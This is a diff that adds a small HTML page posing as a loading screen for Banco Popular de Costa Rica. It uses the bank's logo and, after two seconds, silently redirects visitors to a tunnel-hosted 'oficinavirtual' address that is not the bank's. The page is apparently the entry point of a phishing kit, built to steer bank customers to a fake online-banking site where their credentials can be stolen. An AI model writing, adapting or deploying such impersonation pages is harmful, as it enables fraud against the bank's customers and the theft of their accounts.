@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loader BP Costa Rica</title>
+    <style>
+        html, body {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #F57C00;
+            margin: 0;
+        }
+        .loader-container {
+            position: relative;
+            width: 150px;
+            height: 150px;
+        }
+        .loader-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            animation: bounce 2s infinite ease-in-out;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            setTimeout(() => {
+                window.location.assign("https://tklsmboutsboccette.loclx.io/a2601oficinavirtual/");
+            }, 2000);
+        });
+    </script>
+</head>
+<body>
+    <div class="loader-container">
+        <img src="https://www.bancopopular.fi.cr/wp-content/themes/bp/assets/img/bp-logo.svg" alt="BP Costa Rica Logo">
+    </div>
+</body>
+</html>
